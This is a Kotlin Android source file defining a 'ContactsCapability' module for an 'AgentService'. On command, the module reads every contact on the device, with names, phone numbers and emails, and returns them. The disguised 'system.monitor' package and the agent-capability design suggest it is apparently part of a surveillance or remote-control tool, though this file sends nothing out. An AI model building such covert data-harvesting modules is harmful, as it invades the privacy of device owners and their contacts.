package com.system.monitor.capabilities

import android.content.ContentResolver
import android.database.Cursor
import android.provider.ContactsContract
import com.google.gson.Gson
import com.system.monitor.AgentService

class ContactsCapability(private val service: AgentService) : AgentService.Capability {

    private val gson = Gson()

    override fun execute(args: String?): Any {
        val resolver: ContentResolver = service.contentResolver
        val cursor = resolver.query(
            ContactsContract.Contacts.CONTENT_URI,
            null, null, null, null
        ) ?: return mapOf("error" to "no contacts")

        val contacts = mutableListOf<Map<String, Any>>()
        while (cursor.moveToNext()) {
            val id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID))
            val name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME))
            val hasPhone = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)).toInt() > 0

            val phones = mutableListOf<String>()
            if (hasPhone) {
                val pCur = resolver.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", arrayOf(id), null
                )
                pCur?.use { while (it.moveToNext()) {
                    phones.add(it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)))
                }}
            }

            val emails = mutableListOf<String>()
            val eCur = resolver.query(
                ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                null, ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?", arrayOf(id), null
            )
            eCur?.use { while (it.moveToNext()) {
                emails.add(it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS)))
            }}

            contacts.add(mapOf("id" to id, "name" to name, "phones" to phones, "emails" to emails))
        }
        cursor.close()
        return mapOf("contacts" to contacts)
    }

    override fun cleanup() {}
}